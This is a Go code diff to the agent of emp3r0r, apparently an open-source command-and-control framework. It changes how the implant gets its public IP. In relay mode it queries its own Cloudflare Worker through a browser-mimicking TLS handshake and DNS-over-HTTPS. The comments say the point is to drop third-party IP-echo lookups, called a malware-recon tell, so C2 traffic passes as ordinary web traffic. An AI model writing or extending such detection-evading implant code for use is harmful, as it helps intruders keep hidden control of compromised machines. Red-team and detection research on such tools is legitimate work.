@@ -6,15 +6,20 @@ import (
 	"math/rand"
 	"net"
 	"net/http"
+	"net/url"
 	"strings"
 	"sync"
 	"time"
+
+	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
+	"github.com/jm33-m0/emp3r0r/core/internal/transport"
 )
 
-// externalIPSources are public "echo your IP" endpoints. They are queried
-// over plain HTTPS with the system root store — this is not C2 traffic, so
-// the standard Go TLS fingerprint is fine here (same trust level as the
-// NCSI connectivity probe).
+// externalIPSources are public "echo your IP" endpoints, used ONLY when no
+// relay is configured (direct/http_poll test mode). In relay mode the agent
+// asks its own Worker (GET /extip) instead: third-party IP-echo services are
+// a classic malware-recon indicator, and querying them from the same host
+// that keeps a long-lived WSS to an obscure domain practically shouts C2.
 var externalIPSources = []string{
 	"https://api.ip.sb/ip",
 	"https://ifconfig.me/ip",
@@ -24,9 +29,9 @@ var externalIPSources = []string{
 	"https://ipinfo.io/ip",
 }
 
-// GetExternalIP resolves this machine's public egress IP: it picks 3 random
-// sources from the pool and races them concurrently, returning the first
-// valid answer. Returns "" when all fail (e.g. no direct internet access).
+// GetExternalIP resolves this machine's public egress IP. In relay mode it
+// comes from the relay Worker (CF-Connecting-IP); otherwise from public
+// echo services. Returns "" when nothing answers.
 //
 // The CC cannot derive this address when agents dial in through the relay —
 // the CC only ever sees the relay's (Cloudflare edge) address — so the agent
@@ -38,6 +43,14 @@ func GetExternalIP() string {
 
 // GetExternalIPTimeout is GetExternalIP with an explicit overall budget.
 func GetExternalIPTimeout(timeout time.Duration) string {
+	// Relay mode first: same domain, same browser-fingerprinted TLS as the
+	// WS channel — indistinguishable from ordinary web-app traffic. No
+	// third-party fallback in relay mode: a failed relay means checkin
+	// fails anyway, and the fallback would reintroduce the recon tell.
+	if common.RuntimeConfig.C2ChannelMode == "worker_ws" || strings.HasPrefix(common.RuntimeConfig.CCAddress, "wss://") {
+		return relayExternalIP(timeout)
+	}
+
 	pool := append([]string(nil), externalIPSources...)
 	rand.Shuffle(len(pool), func(i, j int) { pool[i], pool[j] = pool[j], pool[i] })
 	if len(pool) > 3 {
@@ -78,6 +91,61 @@ func GetExternalIPTimeout(timeout time.Duration) string {
 		}
 	}
 	return ""
+}
+
+// relayExternalIP asks the relay Worker for our egress address: CF sees the
+// client's real IP (CF-Connecting-IP) and returns it. The HTTPS request
+// rides BrowserLikeTLSDial — the same randomized browser ClientHello as the
+// WS channel — resolved via the agent's DoH resolver, on the relay's own
+// domain. Empty string on any failure.
+func relayExternalIP(timeout time.Duration) string {
+	addr := common.RuntimeConfig.CCAddress
+	if !strings.HasPrefix(addr, "wss://") && !strings.HasPrefix(addr, "ws://") {
+		return ""
+	}
+	u, err := url.Parse(addr)
+	if err != nil || u.Host == "" {
+		return ""
+	}
+	secret := u.Query().Get("secret")
+	if secret == "" {
+		return ""
+	}
+	endpoint := "https://" + u.Host + "/extip?secret=" + url.QueryEscape(secret)
+
+	client := &http.Client{
+		Timeout: timeout,
+		Transport: &http.Transport{
+			ForceAttemptHTTP2: false, // uTLS negotiates http/1.1 (WS-like ALPN)
+			DialTLSContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
+				// resolved via net.DefaultResolver (the agent's DoH)
+				return transport.BrowserLikeTLSDial(ctx, addr, nil)
+			},
+		},
+	}
+	ctx, cancel := context.WithTimeout(context.Background(), timeout)
+	defer cancel()
+	req, err := http.NewRequestWithContext(ctx, http.MethodGet, endpoint, nil)
+	if err != nil {
+		return ""
+	}
+	resp, err := client.Do(req)
+	if err != nil {
+		return ""
+	}
+	defer resp.Body.Close()
+	if resp.StatusCode != http.StatusOK {
+		return ""
+	}
+	body, err := io.ReadAll(io.LimitReader(resp.Body, 64))
+	if err != nil {
+		return ""
+	}
+	ip := strings.TrimSpace(string(body))
+	if net.ParseIP(ip) == nil {
+		return ""
+	}
+	return ip
 }
 
 func queryExternalIPSource(ctx context.Context, src string) string {
